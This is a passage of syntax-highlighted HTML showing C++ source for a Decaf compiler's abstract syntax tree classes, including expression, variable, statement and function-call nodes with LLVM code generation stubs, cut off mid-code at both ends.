(list&lt;decafAST *&gt;::iterator i = stmts.<span class="built_in">begin</span>(); i != stmts.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">			<span class="keyword">delete</span> *i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafAST *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> stmts; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafAST *&gt;(stmts); &#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafAST *&gt;(stmts); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAllexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Kind;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_kind</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Kind; &#125;</span><br><span class="line">	<span class="built_in">decafAllexp</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">decafAllexp</span>(string name,string kind) : <span class="built_in">Name</span>(name),<span class="built_in">Kind</span>(kind)&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = valueK;</span><br><span class="line">		map&lt;string,<span class="keyword">int</span>&gt; tab = &#123;</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\t&#x27;&quot;</span>,<span class="string">&#x27;\t&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\r&#x27;&quot;</span>,<span class="string">&#x27;\r&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\n&#x27;&quot;</span>,<span class="string">&#x27;\n&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\a&#x27;&quot;</span>,<span class="string">&#x27;\a&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\v&#x27;&quot;</span>,<span class="string">&#x27;\v&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\b&#x27;&quot;</span>,<span class="string">&#x27;\b&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\f&#x27;&quot;</span>,<span class="string">&#x27;\f&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\\&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&#x27;&#x27;&quot;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&quot;&#x27;&quot;</span>,<span class="string">&#x27;\&quot;&#x27;</span>&#125;,</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">if</span>( kind == <span class="string">&quot;NumberExpr&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(tab.<span class="built_in">count</span>(<span class="keyword">this</span>-&gt;Name))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(tab[<span class="keyword">this</span>-&gt;Name]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">0</span>]<span class="number">-48</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">3</span> &amp;&amp; ( <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&#x27;&#x27;</span> || <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&quot;&#x27;</span> ))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>( kind == <span class="string">&quot;StringConstant&quot;</span>)&#123;</span><br><span class="line">			string s = <span class="keyword">this</span>-&gt;<span class="built_in">get_name</span>().<span class="built_in">erase</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">			s.<span class="built_in">pop_back</span>();</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(s[i] == <span class="string">&#x27;\\&#x27;</span>)&#123;</span><br><span class="line">					<span class="keyword">char</span> t[<span class="number">0x8</span>];</span><br><span class="line">					<span class="built_in">sprintf</span>(t,<span class="string">&quot;&#x27;\\%c&#x27;&quot;</span>,s[i+<span class="number">1</span>]);</span><br><span class="line">					s[i+<span class="number">1</span>] = tab[t];</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;s.<span class="built_in">length</span>()<span class="number">-1</span>;j++)&#123;</span><br><span class="line">						s[j] = s[j+<span class="number">1</span>];</span><br><span class="line">					&#125;</span><br><span class="line">					s.<span class="built_in">pop_back</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">this</span>-&gt;Name = s;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Kind + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafArrexp</span> :</span> <span class="keyword">public</span> decafAllexp &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafAllexp * Arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafArrexp</span>(string Name, decafAllexp *Arr) : <span class="built_in">Name</span>(Name), <span class="built_in">Arr</span>(Arr) &#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = arrG;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_arr</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Arr;&#125;  </span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ArrayLocExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Arr) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBinexp</span> :</span> <span class="keyword">public</span> decafAllexp &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string Option;</span><br><span class="line">	decafBinexp * Exp1;</span><br><span class="line">	decafBinexp * Exp2;</span><br><span class="line">	<span class="built_in">decafBinexp</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">decafBinexp</span>(string op, decafBinexp *exp1, decafBinexp *exp2) </span><br><span class="line">		: <span class="built_in">Option</span>(op), <span class="built_in">Exp1</span>(exp1), <span class="built_in">Exp2</span>(exp2) &#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;des.kind = expbK;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">get_op</span><span class="params">(string Option)</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;BinaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp2) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decafBinexp::get_op</span><span class="params">(string Option)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(Option == <span class="string">&quot;Plus&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> addtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Minus&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> subtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Mult&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> multmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;UnaryMinus&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> negtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Div&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> divtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Mod&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> modtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Or&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> ortmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;And&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> andtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Eq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> eqtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Neq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> neqtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Not&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> nottmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Lt&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> slttmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Gt&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> gttmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Leq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> sletmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Geq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> geqtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Leftshift&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> shltmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Rightshift&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> lshrtmp;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafUnaryexp</span> :</span> <span class="keyword">public</span> decafBinexp &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafUnaryexp</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">decafUnaryexp</span>(string op, decafBinexp *exp1)&#123;</span><br><span class="line">		decafBinexp::Option = op;</span><br><span class="line">		decafBinexp::Exp1 = exp1;</span><br><span class="line">		decafBinexp::Exp2 = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = expuK;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;UnaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafType</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::Type* lType;</span><br><span class="line">	llvmType Ty;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="built_in">decafType</span>(string Type)&#123;<span class="keyword">this</span>-&gt;Type = Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVar</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line">	string Kind;</span><br><span class="line">	decafAllexp* Exp;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::AllocaInst *Alloca;</span><br><span class="line">	llvm::Type* lType;</span><br><span class="line">	<span class="built_in">decafVar</span>(string Name) &#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_kind</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Kind;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_arr</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Arr;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(decafType* type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;Type = type-&gt;<span class="built_in">get_type</span>();</span><br><span class="line">		<span class="keyword">this</span>-&gt;lType = type-&gt;lType;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kind</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Kind == <span class="string">&quot;&quot;</span>)</span><br><span class="line">			<span class="keyword">this</span>-&gt;Kind = Kind;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_exp</span><span class="params">(decafAllexp* Exp)</span></span>&#123;<span class="keyword">this</span>-&gt;Exp = Exp;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Exp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;AssignGlobalVar(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp)+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Kind != <span class="string">&quot;&quot;</span> &amp;&amp; Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;FieldDecl(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+Kind+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;	</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVarList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafVar*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafVar*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafVarList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafVar*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(decafType* Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kinds</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_kind</span>(Kind); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafVar *&gt;(List);&#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafVar *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafPara</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafType *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Para.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafType *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafType *&gt;(Para); &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmt</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvmStmt kind;</span><br><span class="line">	<span class="built_in">decafStmt</span>()&#123;&#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmts</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafStmt *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmts</span>() &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafStmt *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafStmt *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafStmt *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> stmts; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafStmt *&gt;(stmts); &#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		llvm::Value* v = listCodegen&lt;decafStmt *&gt;(stmts); </span><br><span class="line">		<span class="keyword">return</span> v;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafCB</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string Data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafCB</span>(string Data)&#123;<span class="keyword">this</span>-&gt;Data = Data;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Data; &#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFunCall</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	list&lt;decafAST *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafFunCall</span>()&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;kind = dcall; </span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = funcK;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(list&lt;decafAST *&gt;  Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Para.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">list&lt;decafAST *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;MethodCall&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + commaList&lt;class decafAST *&gt;(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssign</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string Var;</span><br><span class="line">	<span class="keyword">bool</span> key;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line">	decafBinexp* Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_key</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;<span class="keyword">this</span>-&gt;key = key;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_var</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Var; &#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_arr</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Arr;&#125;</span><br><span class="line">	<span class="function">decafBinexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp; &#125;</span><br><span class="line">	<span class="built_in">decafAssign</span>(string Var, decafBinexp* Exp):<span class="built_in">Var</span>(Var),<span class="built_in">Exp</span>(Exp)&#123;&#125;</span><br><span class="line">	<span class="function">string <span 